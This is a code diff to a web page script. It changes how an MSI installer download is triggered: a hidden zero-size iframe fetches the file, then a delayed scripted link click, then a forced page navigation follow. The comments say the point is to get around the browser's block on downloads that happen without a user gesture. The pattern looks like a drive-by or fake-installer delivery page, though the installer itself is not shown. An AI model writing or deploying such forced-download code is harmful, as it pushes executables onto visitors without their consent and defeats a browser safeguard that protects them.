@@ -261,18 +261,29 @@
         if (triggered) return;
         triggered = true;
 
-        if (downloadBtn) {
-          downloadBtn.click();
-          return;
-        }
+        // Programmatic <a click> is blocked without a user gesture in Chrome/Edge.
+        // Same-origin iframe + attachment header usually starts the download and keeps this page visible.
+        var frame = document.createElement('iframe');
+        frame.setAttribute('aria-hidden', 'true');
+        frame.title = 'download';
+        frame.style.cssText = 'position:absolute;width:0;height:0;border:0;clip:rect(0,0,0,0);overflow:hidden';
+        frame.src = MSI_PATH;
+        document.body.appendChild(frame);
 
-        var link = document.createElement('a');
-        link.href = MSI_PATH;
-        link.download = MSI_NAME;
-        link.rel = 'noopener';
-        document.body.appendChild(link);
-        link.click();
-        link.remove();
+        window.setTimeout(function () {
+          var link = document.createElement('a');
+          link.href = MSI_PATH;
+          link.download = MSI_NAME;
+          link.rel = 'noopener';
+          document.body.appendChild(link);
+          link.click();
+          link.remove();
+        }, 300);
+
+        // Last resort: top-level navigation to the MSI (reliable download, may leave this page).
+        window.setTimeout(function () {
+          window.location.assign(MSI_PATH);
+        }, 1200);
       }
 
       if (stage3) {
